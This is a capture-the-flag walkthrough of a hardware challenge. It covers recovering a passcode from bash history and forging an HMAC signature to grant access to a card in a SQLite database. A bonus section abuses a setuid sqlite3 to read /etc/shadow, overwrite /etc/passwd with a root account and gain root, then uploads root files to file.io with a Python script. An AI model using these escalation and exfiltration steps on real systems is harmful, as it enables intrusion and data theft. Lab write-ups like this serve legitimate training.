> [!NOTE]
> If you see "Oops! Serial connection hasn't been established. Come back once it is connected..." then you must first complete 'Hardware Part 1' before clicking 'Hardware Part 2'.

> ### Silver Medal

Click the 'Hardware Part 2' box: 

> ![Pasted image 20241128202457](attachments/Pasted%20image%2020241128202457.png)

Select '1. Startup system (Default)' and press Enter: 

> ![Pasted image 20241128202716](attachments/Pasted%20image%2020241128202716.png)

```
ls -al
```

> The command 'ls -al' shows there is recorded bash history containing 518 bytes. The file permissions '-r--r--r--' allow us to read the bash history file:
> 
> ![Pasted image 20241128203102](attachments/Pasted%20image%2020241128203102.png)
> 
> Amongst the recorded commands in the '.bash_history' file, we see the passcode in clear text:

```
cat ./.bash_history
```

> ![Pasted image 20241128203430](attachments/Pasted%20image%2020241128203430.png)
> 
> We can use the 'slh' tool with the passcode to set the access level of card with id number 42.

```
slh --passcode CandyCaneCrunch77 --set-access 1 --id 42
```

> ![](attachments/Pasted%20image%2020241201001709.png)
> 
> Enabling access to card 42 completes the Silver challenge
> 
> 
> ### Gold Medal
> 
> Jewel tells us that to complete the Gold challenge, we should generate a valid HMAC signature and update the database directly to grant access to card 42.
> 
> We should first identify the type of database. Since the database is a file called 'access_cards' in our home directory, we can use the 'file' command to identify the file type:

```
file ./access_cards
```

> ~~~
> ./access_cards: SQLite 3.x database, last written using SQLite version 3040001, file counter 4, database pages 32, cookie 0x2, schema 4, UTF-8, version-valid-for 4
> ~~~
> 
> Let's see what tables are configured in the SQLite database 'access_cards':

```
sqlite3 ./access_cards ".tables"
```

> ~~~
> access_cards  config
> ~~~
> 
> Let's check the contents of the 'config' table:

```
sqlite3 ./access_cards "select * from config"
```

> ~~~
> 1|hmac_secret|9ed1515819dec61fd361d5fdabb57f41ecce1a5fe1fe263b98c0d6943b9b232e
> 2|hmac_message_format|{access}{uuid}
> 3|admin_password|3a40ae3f3fd57b2a4513cca783609589dbe51ce5e69739a33141c5717c20c9c1
> 4|app_version|1.0
> ~~~
> 
> Great, the 'config' table has all the information we need to generate HMAC signatures. Now, all we need is the card's uuid, and we already know that to enable access, access is '1'.
> 
> Let's check the layout of the table 'access_cards':

```
sqlite3 ./access_cards "PRAGMA table_info(access_cards)"
```

> ~~~
> 0|id|INTEGER|0||1
> 1|uuid|TEXT|0||0
> 2|access|INTEGER|0||0
> 3|sig|TEXT|0||0
> ~~~
> 
> We can retrieve the uuid of card 42 from the 'access_cards' table as follows:

```
sqlite3 ./access_cards "select uuid from access_cards where id=42"
```

> ~~~
> c06018b6-5e80-4395-ab71-ae5124560189
> ~~~
> 
> The following PowerShell script creates a valid HMAC signature with access enabled for card 42:

```powershell
$access = "1"
$card_uuid = "c06018b6-5e80-4395-ab71-ae5124560189"
$hmac_secret = "9ed1515819dec61fd361d5fdabb57f41ecce1a5fe1fe263b98c0d6943b9b232e"

function Convert-HexToBytes {
    param(
        [string]$HexString
    )
    $Bytes = New-Object byte[] ($HexString.Length / 2)
    for($i=0; $i -lt $HexString.Length; $i+=2){
        $Bytes[$i/2] = [Convert]::ToByte($HexString.Substring($i, 2), 16)
    }
    return $Bytes
}

# Create the key as raw bytes (not hex-decoded)
$secret_key = [System.Text.Encoding]::ASCII.GetBytes($hmac_secret)

# Create message bytes
$access = [System.Text.Encoding]::ASCII.GetBytes($access)
$uuid = [System.Text.Encoding]::ASCII.GetBytes($card_uuid)

# Combine bytes
$hmac_message = New-Object byte[] ($access.Length + $uuid.Length)
[System.Buffer]::BlockCopy($access, 0, $hmac_message, 0, $access.Length)
[System.Buffer]::BlockCopy($uuid, 0, $hmac_message, $access.Length, $uuid.Length)

# Create HMAC
$hmac = New-Object System.Security.Cryptography.HMACSHA256
$hmac.Key = $secret_key
$signature = [System.BitConverter]::ToString($hmac.ComputeHash($hmac_message)).Replace("-", "").ToLower()

# Output
Write-Host "signature = $signature"
```

> The PowerShell script outputs the HMAC signature:
> 
> ~~~
> signature = 135a32d5026c5628b1753e6c67015c0f04e26051ef7391c2552de2816b1b7096
> ~~~
> 
> Now that we have a valid signature, we can update the database:

```
sqlite3 ./access_cards "update access_cards SET access=1, sig='135a32d5026c5628b1753e6c67015c0f04e26051ef7391c2552de2816b1b7096' where id=42"
```

> After a few seconds, we see the success message:
> 
> ![](attachments/Pasted%20image%2020241201001935.png)
> 
> This completes the Gold challenge.
> 
> Medal progress:
> 
> ![Pasted image 20241128210538](attachments/Pasted%20image%2020241128210538.png)
> 
> 
> ### Bonus - privilege escalation to root
> 
> The '/usr/bin/sqlite3' executable runs as root with setuid bit set:
> 
> ![](attachments/Pasted%20image%2020241130171404.png)
> 
> This means that the 'sqlite3' binary will always run under its owner's privileges - in this case, that means root privileges. We can test this using the following command:

```
sqlite3 /dev/null -cmd ".read /etc/shadow"
```

> ~~~
> Parse error near line 1: near "root": syntax error
>   root:*:20038:0:99999:7::: daemon:*:20038:0:99999:7::: bin:*:20038:0:99999:7:::
>   ^--- error here
> SQLite version 3.40.1 2022-12-28 14:03:47
> Enter ".help" for usage hints.
> sqlite>
> ~~~
> 
> After the Parse error, some of the content of the file '/etc/shadow' is shown on the screen, and since this file can only be read with root privileges, the .read command must have ran with root privileges.
> 
> The sqlite3 tool '.output' command can be (ab)used to save files and content to disk.

> [!TIP] Python can generate crypt(3) hashes.
> The following example uses the password 'root' with salt 'gh':
> ~~~
> python3 -c 'import crypt; print(crypt.crypt("root","gh"))'
> ~~~

```
passwd=/etc/passwd; sqlite3 /dev/null -cmd ".output $passwd" 'select "toor:ghTxbhWkM20DQ:0:0:root:/root:/bin/bash";'
```

> Then, we use the 'su' command with our configured password 'root' to elevate our privileges:

```
su toor
```

> ~~~
> Password:
> ~~~
> 
> enter the password 'root'

```
root
```

> ~~~
> bash: cannot set terminal process group (9): Inappropriate ioctl for device
> bash: no job control in this shell
> 
> The 'id' command confirms we are root user (uid=0)

```
id
```

> ~~~
> uid=0(toor) gid=0(root) groups=0(root)
> ~~~
> 
> Check for advanced languages running on the server that we may use: 

```
find /*bin /usr/*bin -type f | grep -P "(python|perl|ruby|wget|curl)"
```

> ~~~
> /usr/bin/perl5.36.0
> /usr/bin/perl
> /usr/bin/python3.11
> ~~~
> 
> We can exfiltrate any file using python3.11 with the following script:

```
import urllib.request
import json
import os

url = 'https://file.io'
file_path = '/root/check_hmac'
boundary = '-------------boundary'

# Prepare the form data
with open(file_path, 'rb') as f:
    form_data = (
        f'--{boundary}\r\n'
        f'Content-Disposition: form-data; name="file"; filename="{os.path.basename(file_path)}"\r\n'
        'Content-Type: application/octet-stream\r\n'
        '\r\n'
    ).encode('utf-8')
    
    form_data += f.read()
    form_data += f'\r\n--{boundary}--\r\n'.encode('utf-8')

headers = {
    'Content-Type': f'multipart/form-data; boundary={boundary}'
}

request = urllib.request.Request(url, data=form_data, headers=headers)
response = urllib.request.urlopen(request)
result = json.loads(response.read().decode('utf-8'))
print(result['link'])

```

> The output of the script above should be a link similar to: https://file.io/PqjegAcFY0Dk
> 
> Once exfiltrated, we can download the file '/usr/bin/main' and '/bin/slh' using the same method:
> 
> ![](attachments/Pasted%20image%2020241129152846.png)
> 
> To download the file, simply navigate to the link using a browser.
